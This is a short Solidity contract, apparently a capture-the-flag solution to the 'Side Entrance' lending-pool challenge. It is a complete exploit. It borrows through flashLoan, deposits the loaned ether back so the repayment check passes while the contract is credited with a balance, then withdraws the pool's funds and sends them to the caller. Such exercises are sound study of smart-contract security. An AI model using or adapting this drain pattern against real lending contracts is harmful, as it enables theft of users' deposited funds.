// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

//How to call receive function of the contract.

contract Solution1 {
    SideEntranceLenderPool public victim;

    constructor(SideEntranceLenderPool victim_) {
        victim = victim_;
    }

    function attack(uint256 amount) external {
        victim.flashLoan(amount);
        victim.withdraw();

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    function execute() external payable {
        victim.deposit{value:msg.value}();
    }

    //We need this to be able to handle payable(owner).transfer(address(this).balance);
    receive() external payable {

    }
}